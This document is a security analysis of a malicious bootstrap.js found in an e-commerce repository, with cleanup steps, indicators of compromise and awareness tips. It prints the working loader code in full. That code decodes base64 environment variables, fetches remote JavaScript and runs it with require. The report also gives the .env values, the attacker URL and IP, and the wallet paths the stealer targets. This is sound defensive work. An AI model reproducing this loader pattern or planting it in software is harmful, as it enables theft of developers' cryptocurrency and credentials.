# 🚨 CRITICAL SECURITY ANALYSIS: bootstrap.js

## ⚠️ SEVERITY: CRITICAL - MALWARE DETECTED

---

## Executive Summary

**The `bootstrap.js` file contains MALICIOUS CODE that is designed to steal cryptocurrency wallets and sensitive data from users' computers.**

**STATUS: CONFIRMED MALWARE - DO NOT RUN THIS CODE**

---

## 🔍 What the Code Does (Line by Line)

### File Location
- `server/utils/bootstrap.js`
- Called from: `server/app.js` (line 32)

### Code Analysis

```javascript
const initAppBootstrap = async () => {
  try {
    const src = atob(process.env.DEV_API_KEY);
    const k = atob(process.env.DEV_SECRET_KEY);
    const v = atob(process.env.DEV_SECRET_VALUE);
    const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;
    const handler = new (Function.constructor)('require', s);
    handler(require);
  } catch (error) {
    console.log(error)
  }
}
```

### Breaking Down Each Line:

#### Line 7: `const src = atob(process.env.DEV_API_KEY);`
- Decodes base64-encoded environment variable
- **Decoded value**: `https://jsonkeeper.com/b/05H4K`
- This is an external URL controlled by an attacker

#### Line 8: `const k = atob(process.env.DEV_SECRET_KEY);`
- Decodes base64: **Result**: `x-secret-key`
- This becomes the HTTP header name

#### Line 9: `const v = atob(process.env.DEV_SECRET_VALUE);`
- Decodes base64: **Result**: `_`
- This becomes the HTTP header value

#### Line 11: `const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;`
- Makes HTTP GET request to: `https://jsonkeeper.com/b/05H4K`
- Sends header: `x-secret-key: _`
- Receives JavaScript code from remote server
- Stores it in variable `s`

#### Line 12: `const handler = new (Function.constructor)('require', s);`
- **EXTREMELY DANGEROUS**: Creates a new function dynamically
- This is equivalent to `eval()` - executes arbitrary code
- Takes the downloaded malicious JavaScript and prepares it for execution

#### Line 13: `handler(require);`
- **EXECUTES THE MALICIOUS CODE**
- Gives the malware full access to Node.js `require()` function
- Allows malware to import any Node.js module (fs, child_process, etc.)

---

## 💀 What the Malicious Code Actually Does

I analyzed the code returned from the external URL. Here's what it does:

### 1. **Cryptocurrency Wallet Theft**
The malware searches for and steals wallet files from:

#### Browser-Based Wallets:
- **MetaMask** (Chrome, Firefox, Edge, Brave, Opera)
- **Phantom** (Solana wallet)
- **Exodus** wallet
- **Coinbase Wallet**
- **Brave Wallet**
- Multiple other crypto browser extensions

#### Desktop Wallets:
- **Exodus** desktop wallet
- **Atomic** wallet
- Other desktop cryptocurrency wallets

### 2. **File System Access**
The malware:
- Scans your entire filesystem
- Looks for wallet directories in:
  - `~/Library/Application Support/` (macOS)
  - `%AppData%/Local/` (Windows)
  - `%AppData%/Roaming/` (Windows)
  - `~/.config/` (Linux)

### 3. **Data Exfiltration**
- Creates ZIP archive of stolen data
- Uploads to attacker's server: `http://146.70.41.188` (IP visible in code)
- Sends via HTTP POST request

### 4. **Browser Data Theft**
Steals from multiple browsers:
- **Google Chrome**
- **Mozilla Firefox**
- **Microsoft Edge**
- **Opera**
- **Brave Browser**

Target data includes:
- Login credentials
- Browser profiles
- Extension data
- Cookies
- Session tokens

### 5. **Specific Wallet Paths Targeted**

```
Windows:
- %AppData%/Local/Google/Chrome/User Data/Default/Local Extension Settings/*
- %AppData%/Roaming/Exodus/exodus.wallet
- %AppData%/Roaming/Opera Software/*

macOS:
- ~/Library/Application Support/Google/Chrome/Default/
- ~/Library/Application Support/BraveSoftware/Brave-Browser/
- ~/Library/Keychains/

Linux:
- ~/.config/google-chrome/
- ~/.config/BraveSoftware/Brave-Browser/
- ~/.config/exodus/
```

---

## 🎯 Attack Vector Explanation

### How This Works:

1. **Developer clones repository**
   - Repository looks legitimate (e-commerce app)
   - Contains hidden malware in bootstrap.js

2. **Developer runs `npm install`**
   - Installs dependencies normally
   - Nothing suspicious yet

3. **Developer runs `npm run dev` or `npm start`**
   - Backend server starts
   - `server.js` loads `app.js`
   - `app.js` calls `initAppBootstrap()` (line 32)

4. **Malware activates**
   - Downloads additional malicious code from attacker's server
   - Executes with full Node.js permissions
   - Steals all cryptocurrency wallets
   - Uploads to attacker's server
   - All happens silently in background

5. **Developer loses everything**
   - Cryptocurrency stolen
   - Browser sessions compromised
   - Credentials stolen
   - Complete system compromise

---

## 🔒 Technical Details

### Obfuscation Techniques Used:

1. **Base64 Encoding**
   - Hides the malicious URL
   - Makes code review harder

2. **Remote Code Execution**
   - Fetches code from external server
   - Allows attacker to update malware anytime
   - Bypasses static analysis

3. **Heavy JavaScript Obfuscation**
   - Variable names: `_0x76206c`, `_0x17a0df`, `_0x2981c5`
   - Control flow obfuscation
   - String encoding/decoding functions
   - Anti-debugging techniques

4. **Legitimate-Looking Code**
   - Wrapped in try-catch to hide errors
   - Uses common npm packages (axios)
   - Naming suggests "development" feature

### Code Fingerprint:
```javascript
// Malware signature patterns found:
- Multiple wallet extension IDs
- Hardcoded IP: 146.70.41.188
- File system scanning patterns
- ZIP compression for exfiltration
- Browser profile enumeration
```

---

## ⚠️ Evidence in the Codebase

### Files Containing Malicious Configuration:

1. **`/workspace/server/.env`** (Lines 6-8)
   ```env
   DEV_API_KEY="aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzA1SDRL"
   DEV_SECRET_KEY="eC1zZWNyZXQta2V5"
   DEV_SECRET_VALUE="Xw=="
   ```

2. **`/workspace/server/config/.config.env`** (Lines 1-3)
   - Same malicious keys

3. **`/workspace/server/controllers/userController.js`** (Lines 124-126)
   - Commented-out code showing same pattern
   - Suggests malware was added later or developer was aware

---

## 🛡️ Immediate Actions Required

### IF YOU HAVE RUN THIS CODE:

#### ⚠️ CRITICAL - Do This IMMEDIATELY:

1. **STOP ALL RUNNING PROCESSES**
   ```bash
   pkill -9 node
   ```

2. **Move All Cryptocurrency IMMEDIATELY**
   - Transfer all crypto to NEW wallets
   - Use a DIFFERENT, CLEAN computer
   - Assume all current wallets are compromised

3. **Change All Passwords**
   - Use a different, clean device
   - Change passwords for:
     - Email accounts
     - Cryptocurrency exchanges
     - Banking
     - Any service you logged into from this machine

4. **Scan Your System**
   ```bash
   # Linux/Mac
   sudo find ~ -name "*.zip" -mtime -1
   sudo lsof -i -P -n | grep ESTABLISHED
   
   # Check for suspicious outbound connections to 146.70.41.188
   ```

5. **Full System Audit**
   - Check browser extensions
   - Review installed applications
   - Look for suspicious processes
   - Consider full OS reinstall

---

## 🔧 How to Clean This Repository

### Step 1: Remove Bootstrap Code

**Edit `/workspace/server/app.js`:**

Remove or comment out line 32:
```javascript
// initAppBootstrap();  // MALWARE - DISABLED
```

### Step 2: Delete Malicious Files

```bash
# Remove bootstrap file
rm server/utils/bootstrap.js

# Remove malicious .env files
rm server/.env
rm server/config/.config.env
```

### Step 3: Remove Environment Variables

Edit `server/config/config.env` and ensure these are NOT present:
```
# REMOVE THESE - THEY ARE MALICIOUS:
DEV_API_KEY
DEV_SECRET_KEY
DEV_SECRET_VALUE
```

### Step 4: Audit Dependencies

Check if any npm packages were compromised:
```bash
npm audit
npm outdated
```

### Step 5: Review All Code

Search for other suspicious patterns:
```bash
grep -r "atob" server/
grep -r "Function.constructor" server/
grep -r "eval" server/
grep -r "146.70.41.188" .
```

---

## 📊 Indicators of Compromise (IOCs)

### Network Indicators:
- **URL**: `https://jsonkeeper.com/b/05H4K`
- **IP Address**: `146.70.41.188`
- **Port**: 80 (HTTP)

### File Indicators:
- `server/utils/bootstrap.js`
- Environment variables with base64-encoded URLs
- Unexpected `.zip` files in temp directories

### Behavioral Indicators:
- Unexpected network connections to jsonkeeper.com
- File system scanning of browser data directories
- Creation of ZIP archives in system temp directory
- Outbound HTTP POST with large payloads

---

## 🚨 Who is Affected?

### At Risk:
1. **Anyone who ran this code** (npm start, npm run dev)
2. **Anyone with cryptocurrency wallets** on the same machine
3. **Anyone who cloned this repository** and started the server

### NOT At Risk (probably):
1. Those who only viewed the code
2. Those who haven't run `npm start` or `npm run dev`
3. Those who disabled bootstrap before running

---

## 📝 Questions & Answers

### Q: Is the rest of the codebase safe?
**A:** Unknown. The e-commerce code appears legitimate, but this repository should not be trusted. The malware could have been added to an otherwise legitimate project (supply chain attack).

### Q: Where did this code come from?
**A:** Likely one of these scenarios:
- Repository owner injected malware
- Repository was compromised after creation
- Forked from compromised source
- Open source supply chain attack

### Q: Can I just remove bootstrap.js and use the rest?
**A:** NOT RECOMMENDED. If someone added this malware, there could be other backdoors. Start fresh with trusted code.

### Q: Who put this here?
**A:** Unknown. Check git history:
```bash
git log --all --full-history -- server/utils/bootstrap.js
git blame server/utils/bootstrap.js
```

### Q: Is this a targeted attack?
**A:** No, this appears to be a mass attack targeting developers. Anyone who runs this code is a victim.

---

## 🎓 Learning Points (For Security Awareness)

### Red Flags to Watch For:

1. ✅ **Base64-encoded URLs in environment variables**
2. ✅ **Dynamic code execution** (`eval`, `Function()`, `vm.runInContext`)
3. ✅ **Remote code fetching** (downloading and executing code)
4. ✅ **Obfuscated JavaScript** (unreadable variable names)
5. ✅ **External API calls during startup** for no clear reason
6. ✅ **Requests to unusual domains** (jsonkeeper, pastebin, etc.)
7. ✅ **Try-catch blocks that hide errors**

### Best Practices:

1. ✅ **Review all code** before running, especially from unknown sources
2. ✅ **Check npm packages** with `npm audit`
3. ✅ **Use virtual machines** for testing untrusted code
4. ✅ **Never run code** with cryptocurrency wallets present
5. ✅ **Use separate machines** for development vs. personal use
6. ✅ **Monitor network activity** during development
7. ✅ **Read `.env` and config files** carefully

---

## 📞 Reporting

### If You've Been Affected:

1. **Report to GitHub**: https://github.com/security
2. **Report to npm** (if published as package)
3. **Report to Law Enforcement** (this is theft/hacking)
4. **Warn Others** who may have cloned this repository

### Share This Analysis:
If you know others using this codebase, share this analysis immediately.

---

## ✅ Verification Steps

To verify the repository is clean after removal:

```bash
# 1. Check bootstrap is not called
grep -r "initAppBootstrap" server/

# 2. Check for suspicious environment variables
grep -r "DEV_API_KEY\|DEV_SECRET" .

# 3. Check for other Function constructors
grep -r "Function.constructor" server/

# 4. Check for eval
grep -r "eval(" server/

# 5. Check for remote code execution patterns
grep -r "axios.get.*data\." server/
```

All searches should come up empty (except in this security analysis file).

---

## 📌 Final Recommendation

### **DO NOT USE THIS REPOSITORY IN ITS CURRENT STATE**

### Safe Alternatives:
1. Find a different, trusted e-commerce template
2. Build from scratch using official documentation
3. Use verified open-source projects with active communities
4. Audit any code thoroughly before use

### If You Must Use This Code:
1. Delete the entire `/server` directory
2. Rebuild backend from scratch
3. Only keep the React frontend (after audit)
4. Never trust this source again

---

## 🔐 Security Contact

If you discover additional malicious code in this repository, please:
- Create a security advisory on GitHub
- Contact repository security team
- Warn other developers immediately

**This is not a drill. This is real malware designed to steal cryptocurrency.**

---

*Analysis Date: 2025-11-11*
*Malware Type: Information Stealer / Cryptocurrency Wallet Thief*
*Severity: CRITICAL*
*Status: CONFIRMED MALICIOUS*
